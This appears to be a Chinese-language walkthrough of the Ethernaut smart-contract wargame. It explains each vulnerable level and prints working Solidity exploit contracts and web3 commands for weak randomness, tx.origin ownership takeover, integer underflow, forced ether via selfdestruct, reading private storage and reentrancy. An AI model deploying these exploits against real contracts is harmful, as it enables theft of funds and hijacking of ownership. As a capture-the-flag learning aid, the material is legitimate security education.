https://ethernaut.openzeppelin.com/

# challenges

## Fallback

此challenge重点在[fallback函数](https://docs.soliditylang.org/en/latest/contracts.html?highlight=fallback#fallback-function)

fallback函数在以下情况会执行：
- 调用该合约中不存在的函数
- 有账户向该合约发送以太币(没有相应的接收函数)

通过`contract.sentTransaction({value: 1})`即可调用`fallback()`函数

## Coin Flip

此challenge重点在随机数安全

通过challenge的条件是连续猜对十个bool值，该bool是从上一个区块的哈希值计算出：
```solidity
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
uint256 coinFlip = blockValue.div(FACTOR);
bool side = coinFlip == 1 ? true : false;
```

上一个区块的哈希值是链上公开数据。解决方法是：自己部署一个合约，用相同的逻辑计算出该bool值，再调用challenge中的合约把事先计算出的答案传递过去。

```solidity
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';
import './coinflip.sol';

contract CoinFlipPoc {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip target;
  
  constructor (address adimAddr) public {
      target = CoinFlip(adimAddr);
  }

  function hack() public {
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));
      uint256 coinFlip =uint256(uint256(blockValue) / FACTOR);
      bool guess = coinFlip == 1 ? true : false;
      target.flip(guess);
  }
}
```

## Telephone

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

[官方文档](https://docs.soliditylang.org/en/latest/cheatsheet.html?highlight=tx.origin#global-variables)
`tx.origin`和`msg.sender`的区别

- `msg.sender` (address): sender of the message (current call)
- `tx.origin` (address): sender of the transaction (full call chain)

然后合约中可以调用其他合约。自己起个合约调用challenge合约中的`changeOwner`函数即可。
此时`tx.origin`就是我的地址，`msg.sender`是我部署的合约的地址。

```solidity
pragma solidity ^0.6.0;

import './telephone.sol';

contract Exp_Telephone {

  Telephone public aim;

  constructor(address _aim) public {
    aim = Telephone(_aim);
  }

  function hack(address me) public {
    aim.changeOwner(me);
  }
}
```

## Token

正整形数的下溢

```solidity
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);
  balances[msg.sender] -= _value;
  balances[_to] += _value;
  return true;
}
```

用户初始balances为20，只要向其他地址发送大于20的就会产生下溢，得到一个很大的数字。

```javascript
await contract.transfer("0x"+"0".repeat(40), 21)
```

## Delegation

参考https://paper.seebug.org/633

几种调用合约方法的区别：

- call: msg 的值会修改，执行环境改变
- delegatecall: msg 的值不会被修改，执行环境不变
- callcode: msg 的值会被修改，执行环境不变

delegatecall和callcode的执行环境不变，并不是变量名相同

而是指在赋值的时候，该变量在此合约对应slot映射到原来合约的slot

见 https://github.com/ethereum/solidity/issues/944

其次这三个函数的调用方法都相同，均为：

```solidity
addr.call(bytes4(keccak256("test()")));  // no params
addr.call(bytes4(keccak256("test(uint256)")), 10);  // with params
```

web3中的调用方法为：

```javascript
await contract.sendTransaction({data: web3.utils.sha3("pwn()").slice(0,10)});
```

## Force

合约没有任何内容，challenge通过的条件为合约地址中余额大于0

```javascript
web3.eth.sendTransaction({from: player, to: contract.address, value: 1})
```

直接发送会失败。
两种方法：

- 创建一个合约并让它自毁，指定自毁后余额去向
- 挖矿并将奖励接收地址设置为它

payload：

```solidity
pragma solidity ^0.6.0;

contract Force_exp {
    constructor() payable public{}
    
    function exp(address aim) public{
        selfdestruct(payable(aim));
    }
}
```

## Vault

该challenge有一个被private修饰的password，需要获取password值。

[官方文档](https://docs.soliditylang.org/en/latest/contracts.html?highlight=private#visibility-and-getters) 
描述针对状态变量的三种visibility区别：

- `public` can be either called internally or via messages. For public state variables, an automatic getter function (see below) is generated.
- `internal` can only be accessed internally (i.e. from within the current contract or contracts deriving from it), without using this. This is the default visibility level for state variables.
- `private` only visible for the contract they are defined in and not in derived contracts.

下面还给了个note：

>Everything that is inside a contract is visible to all observers external to the blockchain. Making something private only prevents other contracts from reading or modifying the information, but it will still be visible to the whole world outside of the blockchain.

也就是说，private仅仅起到可以不被其他合约读取和修改，但还是属于链上公开信息。

```solidity
constructor(bytes32 _password) public {
  locked = true;
  password = _password;
}
```

该合约在创建时，password是输入数据，因此顺着合约地址找到 [区块链浏览器](https://rinkeby.etherscan.io/) 上对应创建合约的这笔交易信息的State中可以看到对State的修改也即password的修改

更好的做法是利用web3

```javascript
web3.utils.toAscii(await web3.eth.getStorageAt(contract.address, 1))
```

## King

此challenge提供了一种攻击transfer()的方法

由于transfer调用失败时会进行回滚，后面的代码无法执行，构造一个没有实现payable的合约地址，即可使下面代码一直调用失败：

```solidity
givenaddress.transfer(msg.value);
```

## Re-entrancy

challeng代码中的withdraw函数：

```solidity
function withdraw(uint _amount) public {
  if(balances[msg.sender] >= _amount) {
    (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
    if(result) {
      _amount;
    }
    balances[msg.sender] -= _amount;
  }
}
```

执行的步骤为：
1. 判断余额是否足够
2. 转账
3. 修改余额

如果在第二步中，向一个合约地址转账，则会调用此合约的fallback函数(if exists)。

在fallback函数中再调用challenge合约中的withdraw函数，由于在之前的withdraw调用中没有到第三步修改余额，所以此次依然能通过判断。由此实现递归调用withdraw。

这就是重入攻击。

还有一个细节在于gas。合约中转账三个函数：

- `transfer()` 
- `send()`
- `call()`

前两个函数只会传递固定的2300 gas。2300 gas足以在fallback函数中进行写下日志的操作，但不足以进行重入调用，因此可以防范重入攻击。

而`call()`一般的用法为：`address.call{value: msg.value, gas: 1000000}("")`，可以自定义gas值，缺省默认所有。

在开发过程中，让自己的合约代码受到2300 gas的限制还是挺难受的，因为随着以太坊的升级，同一个操作可能以后gas费会变，这就导致了合约代码向后兼容性的问题。因此大家用call还是挺多的，解决重入攻击两种方法：

1. 在转帐前修改余额
2. 全局锁

exp：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './reentrance.sol';

contract Reentrance_exp {
    Reentrance target;
    uint256 donated;
    
    constructor(address payable _target) public payable {
        target = Reentrance(_target);
        donated = msg.value;
        target.donate{value: msg.value}(address(this));
    }
    
    function attack() public payable{
        target.withdraw(donated);
    }
    
    fallback() external payable {
        target.withdraw(donated);
    }
}
```

## Elevator

challenge代码如下：

```solidity
function goTo(uint _floor) public {
  Building building = Building(msg.sender); 
  if (! building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
  }
}
```

通过目标：`top`值为true。

两次调用`isLastFloor`的返回值不同即可

## Privacy

合约中的变量都可以使用`web3.eth.getStorageAt(address, index)`获取，大概有以下规律：

1. 常量(constant)不在存储中
2. 一块存储32(256 bits)字节宽
3. 相邻uint和byte如果不满32字节，会合并到一个slot中
4. string类型会在slot最后一个字节中写入长度
5. mapping类型需要知道键名，存储到`sha3(key + index)`内
6. 数组类型，index slot中存储了数组长度，`sha3(index)`为数组第一个元素值，`sha3(1 + sha3(index))`为第n+1个元素的值


## GateKeeper One

两个难点

难点在于过：

```solidity
modifier gateTwo() {
  require(gasleft().mod(8191) == 0);
  _;
}
```

即执行这条语句时，gas剩余量刚好能整除8191。解决方法为用remix进行调试，先随便测试一个gas值，看看进行模运算的时候，栈中的数值是多少，然后进行调整即可。

调试时各opcode指令作用及gas小号可参考下面三个链接([yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf) 过于不讲人话)

https://ethervm.io/

https://github.com/djrtwo/evm-opcode-gas-costs/blob/master/opcode-gas-costs_EIP-150_revision-1e18248_2017-04-12.csv

https://github.com/crytic/evm-opcodes

## GateKeeper Two

